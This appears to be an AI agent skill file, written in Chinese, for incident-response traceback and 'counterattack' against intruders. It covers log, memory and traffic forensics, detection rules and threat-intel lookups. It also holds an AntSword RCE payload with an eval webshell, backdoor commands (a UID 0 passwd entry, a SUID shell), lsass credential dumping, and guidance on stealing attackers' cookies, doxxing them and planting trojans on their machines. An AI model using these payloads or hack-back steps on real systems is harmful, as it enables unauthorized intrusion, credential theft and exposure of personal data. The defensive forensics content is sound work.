---
name: traceback-counterattack
description: >-
  Traceback and counterattack playbook. Use when conducting security incident response, attacker identification, forensics analysis, and counterattack operations against compromised systems.
---

# SKILL: 溯源反制思路整合

## 1. 反制的整体思路

```
反入侵得到攻击者机器权限 → 入侵现场还原 → 摸清入侵思路 → 处理后门遗留 → 抓取入侵者真实IP → 获取地理位置 → 按攻击者攻击路线加固漏洞
```

## 2. 反制具体思路

### 反制主机

傀儡机通常具有漏洞，可以使用常规渗透测试手段进行攻击。

### 反制后门附件

1. **逆向分析**：对附件进行逆向分析，得到C2地址
2. **钓鱼邮件分析**：邮件头中可能包含源IP或域名
3. **后门源码分析**：查看后门源码，找到teamserver回传数据的地址

### 反制攻击工具

**已知有漏洞的工具版本**：

1. **蚁剑 <=2.0.7**：存在RCE漏洞
```php
<?php if(strlen($_POST[1]) == 153){
    preg_match_all('/echo "(\w+)";/i', $_POST[1], $mat);
    $profix = $mat[1][0];
    $suffix = $mat[1][1];
    echo $profix;?>
    <!DOCTYPE html>
    <html>
    <body>
    <script>
    window.open('data:text/html,But this one does! <pre>process.cwd(): <script>document.write(process.cwd());const {spawn} = require("child_process");spawn("open",["/Applications/Calculator.app"]);</scr'+'ipt></pre>');
    </script>
    </body>
    </html>
    <?php echo $suffix;
}else{
    eval($_POST[1]);
}
```

2. **AWVS 10**：存在RCE漏洞，可利用exp等待扫描
3. **Cobalt Strike 3.5**：teamserver存在RCE漏洞
4. **SQLMap**：构造特殊注入点等待攻击者扫描

## 3. 拿下傀儡机后查找源IP

### 日志分析

**Web日志分析**：
```bash
# Nginx/Apache/IIS/Tomcat日志分析
cat access.log | grep "/language/HTML" | cut -d ' ' -f 1 | sort | uniq -c | sort -nr | head -n 10

# 筛选攻击者IP
cat access.log | grep "shell" | cut -d ' ' -f 1 | sort | uniq -c
```

**系统日志分析（Windows）**：
```
日志路径：C:\Windows\System32\winevt\Logs
必看日志：Security.evtx、System.evtx、Application.evtx
```

**系统日志分析（Linux）**：
```bash
# 安全日志
cat /var/log/secure
cat /var/log/auth.log

# 最后登录日志
lastlog

# 历史命令
history
```

### 进程分析

**Windows进程分析**：
```cmd
tasklist                              # 查看进程列表
tasklist | find "16376"               # 查找特定进程
wmic process get caption,commandline  # 详细进程信息
```

**Linux进程分析**：
```bash
ps aux                                # 查看所有进程
top                                   # 实时进程监控
lsof -i                               # 查看进程占用端口
ls -la /proc/<pid>/                   # 进程详细信息
```

### 流量分析

**通用命令**：
```bash
netstat -an                           # 查看网络连接
netstat -na | grep ESTABLISHED        # 查看已建立连接
netstat -unltp                        # 查看进程占用端口
```

**Windows工具**：
- Wireshark
- Fiddler

**Linux工具**：
```bash
tcpdump -i any -c 100 -nn -w /tmp/tcpdump_save.cap
```

### 服务查询

**Windows常见后门技术**：

1. **隐藏/克隆账户**：`test$`，需在用户管理界面查看
2. **Shift后门**：替换`sethc.exe`为`cmd.exe`
3. **启动项/计划任务**：
   - `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
   - 任务计划程序
4. **组策略欺骗**：`gpedit.msc` → 脚本(启动/关机)
5. **映像劫持**：`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
6. **Powershell后门**：检查powershell常驻进程
7. **远控软件**：Cobalt Strike、灰鸽子等

**Linux常见后门技术**：

1. **添加超级用户**：`echo "user:x:0:0::/:/bin/sh" >> /etc/passwd`
2. **SUID Shell**：`cp /bin/bash /dev/.rootshell; chmod u+s /dev/.rootshell`
3. **查找SUID文件**：`find / -perm +4000 -exec ls -ld {} \;`
4. **Crontab定时任务**：`crontab -l`
5. **TCP/UDP/ICMP Shell**：检查异常网络连接

### 其他技巧

1. **查看公钥**：获取攻击者电脑名
2. **查看操作日志**：OpenVPN等
3. **查询在线登录者**：
   - Linux：`w`命令
   - Windows：`query user`

## 4. 溯源相关思路

### 根据IP进行溯源

1. **微步在线**：https://x.threatbook.cn/
2. **VirusTotal**：https://www.virustotal.com/
3. **搜索引擎搜索**：Google/Bing
4. **GitHub搜索**：查找相关代码

### 根据域名进行溯源

1. **WHOIS查询**：获取注册信息
2. **备案查询**：ICP备案信息
3. **企查查/天眼查**：企业信息
4. **ZoomEye/FoFa**：资产测绘

### 根据ID溯源

1. **搜索引擎查找**
2. **GitHub/Gitee/开源中国**
3. **社交平台**：微信/微博/LinkedIn/Twitter
4. **安全圈子询问**

### 根据病毒源码细节溯源

1. **搜索特殊字符串**：在GitHub搜索代码中的特殊标记
2. **查找C2地址**：代码中请求的IP或域名

### 通过手机号码溯源

1. **社交平台查询**：微信/支付宝/微博/抖音
2. **社工库查询**
3. **注册网站查询**：https://www.reg007.com/

## 5. 实战案例

### 案例1：浏览器历史记录溯源

```
攻击者浏览器历史记录中包含手机号 → 百度搜索确认归属地 → 通过手机号反查个人信息 → 定位攻击者身份
```

### 案例2：Cookie/Token溯源

```
找到ICP备案查询的cookie和token → Burp替换后获取攻击者百度ID → 搜索定位真实姓名和单位
```

### 案例3：微信钓鱼反制

```
攻击队发送微信钓鱼 → 模拟个人终端环境点击木马 → 放置反钓鱼木马文件 → 成功上线攻击队机器
```

## 6. 防御建议

- **日志审计**：定期检查Web日志和系统日志
- **入侵检测**：部署IDS/IPS系统
- **流量监控**：使用Wireshark等工具分析异常流量
- **后门检测**：定期扫描系统进程和服务
- **蜜罐部署**：吸引攻击者，收集攻击信息
- **权限最小化**：限制用户权限范围

## 7. [补充推演] 内存取证与高级取证技术

### 内存取证概述

攻击者在目标机器上执行操作后，即使删除了磁盘上的痕迹，内存中仍可能残留关键证据。

**使用Volatility进行内存取证**：
```bash
# 基础信息
volatility -f memory.dmp imageinfo

# 进程列表
volatility -f memory.dmp --profile=Win10x64_19041 pslist

# 检测隐藏进程
volatility -f memory.dmp --profile=Win10x64_19041 pstree

# 网络连接
volatility -f memory.dmp --profile=Win10x64_19041 netscan

# 提取进程内存
volatility -f memory.dmp --profile=Win10x64_19041 memdump -p <PID> -D output/

# 检测Mimikatz等凭据窃取工具
volatility -f memory.dmp --profile=Win10x64_19041 malfind

# 检测注入代码
volatility -f memory.dmp --profile=Win10x64_19041 malfind
```

**使用Volatility 3（新一代）**：
```bash
# 进程列表
python3 vol.py -f memory.dmp windows.pslist

# 网络连接
python3 vol.py -f memory.dmp windows.netscan

# 检测恶意代码注入
python3 vol.py -f memory.dmp windows.malfind

# 提取注册表
python3 vol.py -f memory.dmp windows.registry.hivelist

# 提取凭据
python3 vol.py -f memory.dmp windows.hashdump
python3 vol.py -f memory.dmp windows.lsadump
```

### 获取内存转储

**Windows内存获取**：
```cmd
# 使用winpmem
winpmem_mini_x64.exe memory.dmp

# 使用 procdump
procdump -ma lsass.exe lsass.dmp

# 使用 Comsvcs.dll
rundll32.exe comsvcs.dll MiniDump <PID> C:\lsass.dmp full

# 使用 LiveKD
livekd.exe -o C:\memory.dmp
```

**Linux内存获取**：
```bash
# 使用LiME
insmod lime.ko "path=/tmp/memory.dmp format=lime"

# 使用AVML
avml memory.dmp
```

## 8. [补充推演] 时间线重建与事件关联

### 时间线重建方法论

```
1. 确定事件时间范围
2. 收集多源日志（Web/系统/安全/应用/网络设备）
3. 统一时间格式（UTC）
4. 按时间排序构建事件链
5. 关联分析多源事件
6. 识别攻击者的完整行动轨迹
```

### 日志关联分析

**Windows事件日志关联**：

| 事件ID | 含义 | 取证价值 |
|---|---|---|
| 4624 | 登录成功 | 记录登录类型、源IP、用户 |
| 4625 | 登录失败 | 暴力破解检测 |
| 4672 | 特权登录 | 域管登录追踪 |
| 4688 | 进程创建 | 恶意进程追踪 |
| 4698 | 计划任务创建 | 持久化检测 |
| 4720 | 用户创建 | 后门账户检测 |
| 4732 | 成员添加到组 | 提权检测 |
| 4776 | NTLM认证 | 哈希传递检测 |
| 4768 | TGT请求 | Kerberos攻击检测 |
| 4769 | TGS请求 | Kerberoasting检测 |
| 5140 | 共享访问 | 文件窃取检测 |
| 5145 | 共享文件访问详情 | 文件窃取追踪 |

**使用LogParser分析Windows日志**：
```cmd
# 查找所有登录成功事件
logparser.exe "SELECT TimeGenerated, SourceName, EventID, Message FROM 'C:\Security.evtx' WHERE EventID = 4624"

# 统计登录失败的IP
logparser.exe "SELECT EXTRACT_TOKEN(Message, 18, ' ') as IP, COUNT(*) as Count FROM 'C:\Security.evtx' WHERE EventID = 4625 GROUP BY IP ORDER BY Count DESC"

# 查找非系统时间段的进程创建
logparser.exe "SELECT TimeGenerated, Message FROM 'C:\Security.evtx' WHERE EventID = 4688 AND TimeGenerated BETWEEN TIMESTAMP('2024-01-01 00:00:00', 'yyyy-MM-dd hh:mm:ss') AND TIMESTAMP('2024-01-01 06:00:00', 'yyyy-MM-dd hh:mm:ss')"
```

**使用PowerShell分析日志**：
```powershell
# 查询所有登录事件
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624 or EventID=4625)]]" | Select-Object TimeCreated, Id, Message

# 查找特定IP的所有活动
Get-WinEvent -LogName Security | Where-Object { $_.Message -match "192.168.1.100" } | Select-Object TimeCreated, Id, Message

# 导出安全日志
wevtutil epl Security C:\security.evtx
```

### 网络流量时间线

```bash
# 使用tshark提取HTTP请求时间线
tshark -r capture.pcap -Y "http.request" -T fields -e frame.time -e ip.src -e http.request.method -e http.request.uri

# 提取DNS查询时间线
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e frame.time -e ip.src -e dns.qry.name -e dns.resp.type

# 检测异常连接
tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport
```

## 9. [补充推演] MITRE ATT&CK映射

### 常见攻击行为映射

将观察到的攻击行为映射到MITRE ATT&CK框架，帮助理解攻击者完整攻击链：

| 观察到的行为 | ATT&CK技术 | TTP编号 | 溯源价值 |
|---|---|---|---|
| Mimikatz进程 | Credential Dumping | T1003 | 获取攻击者凭据窃取手法 |
| PsExec远程执行 | Remote Services | T1021 | 横向移动路径追踪 |
| 异常SMB连接 | Admin Shares | T1077 | 横向移动证据 |
| 大量TGS请求 | Kerberoasting | T1558 | 攻击者目标服务识别 |
| 可疑PowerShell | PowerShell | T1086 | 攻击脚本分析 |
| 注册表修改 | Registry Run Keys | T1060 | 持久化机制识别 |
| 计划任务创建 | Scheduled Task | T1053 | 持久化机制识别 |
| 异常DNS查询 | DNS Exfiltration | T1048 | 数据外泄检测 |
| WebShell上传 | Web Shell | T1100 | 初始入侵点确认 |
| C2 Beacon通信 | Standard Application Layer Protocol | T1071 | C2基础设施识别 |

### 使用Sigma规则检测

```yaml
# Sigma规则示例：检测Mimikatz执行
title: Detect Mimikatz
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4688
        NewProcessName|endswith:
            - mimikatz.exe
    condition: selection
level: high
```

## 10. [补充推演] 自动化溯源工具链

### 日志收集与分析

**ELK Stack（Elasticsearch + Logstash + Kibana）**：
```
数据源 → Logstash（收集/解析）→ Elasticsearch（存储/索引）→ Kibana（可视化分析）
```

**Windows事件日志收集**：
```cmd
# 使用Winlogbeat收集Windows事件日志
# winlogbeat.yml配置
winlogbeat.event_logs:
  - name: Security
  - name: System
  - name: Application
  - name: Microsoft-Windows-Sysmon/Operational
  - name: Microsoft-Windows-PowerShell/Operational
```

**Sysmon部署**：
```xml
<!-- Sysmon配置文件示例 -->
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <ProcessCreate onmatch="include">
      <!-- 捕获命令行创建 -->
      <CommandLine condition="contains">powershell</CommandLine>
      <CommandLine condition="contains">mimikatz</CommandLine>
      <CommandLine condition="contains">certutil</CommandLine>
    </ProcessCreate>
    <NetworkConnect onmatch="include">
      <!-- 捕获异常端口连接 -->
      <DestinationPort condition="is">4444</DestinationPort>
      <DestinationPort condition="is">8443</DestinationPort>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

### 自动化威胁情报查询

```bash
# 使用 VirusTotal API 查询IP/域名/文件哈希
curl -X GET "https://www.virustotal.com/api/v3/ip_addresses/1.2.3.4" -H "x-apikey: YOUR_API_KEY"

# 使用微步在线API查询
curl -X GET "https://api.threatbook.cn/v3/scene/ip_reputation" -H "api-key: YOUR_API_KEY"

# 使用 Shodan 查询IP开放端口和服务
curl -X GET "https://api.shodan.io/shodan/host/1.2.3.4?key=YOUR_API_KEY"

# 使用 Censys 查询
curl -X GET "https://search.censys.io/api/v2/hosts/1.2.3.4" -H "Authorization: Basic YOUR_TOKEN"
```

### 蜜罐联动溯源

```
蜜罐触发告警 → 自动化获取攻击者IP
    ↓
自动查询威胁情报（微步/VirusTotal）
    ↓
自动扫描攻击者IP开放端口（Nmap/Masscan）
    ↓
指纹识别（ehole/wappalyzer）
    ↓
WHOIS/备案查询 → 注册人信息
    ↓
社交平台关联 → 攻击者身份
    ↓
生成完整溯源报告
```

## 11. [补充推演] 完整溯源反制决策树

```
发现攻击事件
│
├── 阶段1：应急响应与证据固定
│   ├── 保留系统镜像（磁盘+内存）
│   ├── 提取所有日志（Web/系统/安全/应用）
│   ├── 捕获网络流量（tcpdump/Wireshark）
│   ├── 识别攻击者入口点和攻击路径
│   └── 评估影响范围
│
├── 阶段2：攻击者行为分析
│   ├── 时间线重建
│   ├── MITRE ATT&CK映射
│   ├── 识别使用的工具和技术
│   ├── 识别攻击者IP/域名/C2地址
│   └── 分析攻击者目标（数据窃取/持久化/横向移动）
│
├── 阶段3：溯源追踪
│   ├── 攻击者IP分析
│   │   ├── 威胁情报查询（微步/VT/Shodan）
│   │   ├── 端口扫描和指纹识别
│   │   ├── 反向查找域名关联
│   │   └── 查找IP归属（ISP/地理位置）
│   ├── 域名分析
│   │   ├── WHOIS查询注册人信息
│   │   ├── 备案查询
│   │   ├── 历史DNS记录分析
│   │   └── 子域名关联
│   ├── 文件/样本分析
│   │   ├── 逆向分析获取C2地址
│   │   ├── 特殊字符串搜索（GitHub）
│   │   ├── 编译特征分析
│   │   └── 同源样本关联
│   └── 行为特征分析
│       ├── 攻击时间规律推断时区
│       ├── 攻击工具偏好识别
│       └── TTP指纹匹配已知APT组织
│
├── 阶段4：反制操作（需授权）
│   ├── 反制攻击者工具漏洞
│   │   ├── 蚁剑<=2.0.7 RCE
│   │   ├── AWVS 10 RCE
│   │   ├── Cobalt Strike 3.5 RCE
│   │   └── SQLMap构造注入点
│   ├── 反制攻击者基础设施
│   │   ├── 蜜罐诱饵投放
│   │   ├── 钓鱼反制
│   │   └── 利用C2漏洞
│   └── 反制攻击者本人
│       ├── 浏览器历史记录获取
│       ├── Cookie/Token窃取
│       ├── 手机号/社交账号关联
│       └── 公开信息搜索
│
└── 阶段5：溯源报告
    ├── 完整攻击时间线
    ├── 攻击者TTP分析
    ├── 攻击者身份信息
    ├── 影响评估
    ├── 证据链保全
    └── 加固建议
```

## 12. [补充推演] 跨Skill协作关系

| 场景 | 本Skill提供 | 衔接Skill |
|---|---|---|
| C2流量识别与溯源 | 流量分析、C2特征识别 | c2-remote-control |
| 蜜罐触发后溯源 | 自动化溯源工具链 | honeypot-counterattack |
| 域内攻击行为分析 | 事件日志关联、Kerberos攻击检测 | domain-penetration |
| 内网横向移动检测 | 网络连接分析、进程追踪 | pivoting-lateral-movement |
| 内网入侵取证 | 日志分析、内存取证、时间线重建 | internal-penetration |
| 证据链保全与法律合规 | 完整溯源报告、证据固定 | - |
